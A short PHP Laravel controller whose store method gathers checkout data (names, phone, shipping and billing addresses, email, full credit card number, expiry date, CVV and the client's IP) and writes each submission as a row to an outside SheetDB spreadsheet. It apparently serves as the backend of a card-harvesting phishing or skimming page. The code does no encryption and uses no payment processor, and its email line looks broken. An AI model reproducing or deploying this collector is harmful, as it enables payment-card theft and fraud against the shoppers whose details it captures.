<?php

namespace App\Http\Controllers;

use SheetDB\SheetDB;
use Illuminate\Http\Request;

class PostController extends Controller
{

    public function store(Request $request)
    {
        $sheetdb = new SheetDB('i77oen0q9b6ry');
        $sheetdb->create([
            'email'                     => $request["checkout"]->get('email'),
            'shipping_first_name'       => $request->input('shipping_first_name'),
            'shipping_last_name'        => $request->input('shipping_last_name'),
            'shipping_phone'            => $request->input('shipping_phone'),
            'shipping_address1'         => $request->input('shipping_address1'),
            'shipping_zip'              => $request->input('shipping_zip'),
            'shipping_city'             => $request->input('shipping_city'),
            'shipping_province'         => $request->input('shipping_province'),
            'shipping_country_code'     => $request->input('shipping_country_code'),
            'accepts_marketing'         => $request->input('accepts_marketing'),
            'shipping_rate_id'          => $request->input('shipping_rate_id'),
            'billing_address_same'      => $request->input('billing_address_same'),
            'billing_first_name'        => $request->input('billing_first_name'),
            'billing_last_name'         => $request->input('billing_last_name'),
            'billing_address1'          => $request->input('billing_address1'),
            'billing_zip'               => $request->input('billing_zip'),
            'billing_city'              => $request->input('billing_city'),
            'billing_province'          => $request->input('billing_province'),
            'billing_company'           => $request->input('billing_company'),
            'credit_card_number'        => $request->input('credit_card_number'),
            'cc-exp-month'              => $request->input('cc-exp-month'),
            'cc-exp-year'               => $request->input('cc-exp-year'),
            'credit_card_cvv'           => $request->input('credit_card_cvv'),
            'client_ip'                 => $request->ip(),
        ]);
        return $sheetdb->name();
    }
}